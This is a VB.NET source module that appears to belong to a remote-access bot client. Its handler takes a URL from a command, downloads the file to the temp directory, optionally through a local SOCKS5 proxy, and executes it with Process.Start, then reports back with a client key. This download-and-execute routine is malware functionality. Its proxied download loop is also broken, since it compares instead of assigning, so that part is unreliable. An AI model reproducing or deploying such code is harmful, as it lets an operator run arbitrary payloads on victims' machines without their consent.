Imports System.IO
Imports System.Net
Imports com.LandonKey.SocksWebProxy
Imports Newtonsoft.Json

Module ExecuteCommand
    Public Function Handler(ByVal model As ExecuteModel)
        Try
            Dim r As Random = New Random
            Dim newlocation As String = IO.Path.GetTempPath & r.Next(0, 99999) & model.newExecute.Name
            Dim result As LogModel
            If Not IO.File.Exists(newlocation) Then
                If Not model.newExecute.Proxy Then
                    Dim download As New WebClient
                    download.DownloadFile(model.newExecute.Url, newlocation)
                Else
                    Dim request As HttpWebRequest
                    Dim socket5 As com.LandonKey.SocksWebProxy.Proxy.ProxyConfig = New com.LandonKey.SocksWebProxy.Proxy.ProxyConfig(IPAddress.Loopback, 8181, IPAddress.Loopback, Config.Variables.SocketPort, com.LandonKey.SocksWebProxy.Proxy.ProxyConfig.SocksVersion.Five)
                    request = CType(WebRequest.Create(model.newExecute.Url), HttpWebRequest)
                    request.Proxy = New SocksWebProxy(socket5)
                    request.KeepAlive = False
                    request.Method = WebRequestMethods.Http.Get
                    request.Timeout = 3000
                    Dim response As HttpWebResponse = CType(request.GetResponse(), HttpWebResponse)
                    Dim str As Stream = response.GetResponseStream()
                    Dim bufferSize As Integer = 1024
                    Dim buffer As Byte() = New Byte(bufferSize - 1) {}
                    Dim bytesRead As Integer = 0

                    Dim fileStream As FileStream = File.Create(newlocation)

                    While (bytesRead = str.Read(buffer, 0, bufferSize)) <> 0
                        fileStream.Write(buffer, 0, bytesRead)
                    End While

                End If
                If model.newExecute.Run Then
                    Process.Start(newlocation)
                End If

                result = New LogModel With {
                .Message = "File successfully executed!",
                .Type = "Success",
                .KeyUnique = GetConfigJson().KeyUnique
                }
                Return JsonConvert.SerializeObject(result)
            End If
            result = New LogModel With {
                .Message = "File already exist please try again!",
                .Type = "Error",
                .KeyUnique = GetConfigJson().KeyUnique
            }
            Return JsonConvert.SerializeObject(result)
        Catch ex As Exception
            Dim result As New LogModel With {
                .Message = ex.ToString,
                .Type = "Error",
                .KeyUnique = GetConfigJson().KeyUnique
                }
            Return JsonConvert.SerializeObject(result)
        End Try
    End Function

End Module
